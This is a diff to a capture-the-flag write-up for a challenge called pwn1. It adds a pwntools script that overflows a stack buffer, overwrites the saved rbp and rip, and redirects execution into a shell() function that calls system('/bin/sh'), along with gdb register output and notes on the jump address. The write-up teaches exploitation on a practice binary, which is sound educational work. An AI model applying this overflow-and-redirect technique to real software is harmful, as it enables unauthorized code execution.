@@ -275,20 +275,23 @@ fish: Job 1, './pwn1' terminated by signal SIGSEGV (Address boundary error)
 
 Nice! We can now try to the the minimum number of characters by repeating the same process. You'll notice that we can pass 32 characters without breaking the program. So what happens if we pass 40 or 48 characters? Let's find out.
 
-```
-$ python3 -c 'print("A" * 32 + "B" * 8 + "C" * 8)'
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
-$ gdb ./pwn1
-(skipped)
-(gdb) r
-Starting program: /mnt/data/technical/ctf/sigflag-ctf/pwn/pwn1 
-I sure hope noone calls shell()...
-Give me some input
-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
-Alright you gave me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC�@
+Luckily, we can attach gdb via our python script:
+```python
+from pwn import *
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400b82 in getinput ()
+context(arch = 'amd64', os = 'linux', terminal=['tmux', 'split-window', '-h'])
+
+io = process("./pwn1")
+gdb.attach(io, gdbscript='continue')
+
+print(io.recvuntil(b">", drop=False))
+
+payload = 32 * b"A"
+payload += p64(0x0)             # rbp
+payload += p64(0xdeadbeef)      # rip
+
+io.sendline(payload)
+io.interactive()
 ```
 
 We can print all the registers with the `info registers` (short: `i r`) command:
@@ -310,15 +313,13 @@ r12            0x401770            4200304
 r13            0x401800            4200448
 r14            0x0                 0
 r15            0x0                 0
-rip            0x400b82            0x400b82 <getinput+92>
+rip            0xdeadbeef          0xdeadbeef
 eflags         0x10206             [ PF IF RF ]
 cs             0x33                51
 ss             0x2b                43
 ```
 
-TODO
-
-
+As you can see, we overwrote rbp and rip. We can now set rip to whereever we want and the code execution will continue from there. If you opened the binary in Ghidra or IDA, you probably noticed the shell function. It calls `system` with `/bin/sh` as param. 
 
 ```
 .text:0000000000400B83 shell           proc near
@@ -332,6 +333,8 @@ TODO
 .text:0000000000400B95                 retn
 .text:0000000000400B95 ; } // starts at 400B83
 ```
+
+**Setting rip to 0x400B83 (start of shell function) won't work!** Why? Because we are overwriting rbp (stack base pointer) with some random value which won't be valid. We can get around that by just jumping to the call and parameter setup at `0x400B87` directly. Now it works and we get flag. 
 
 ## Crypto
 
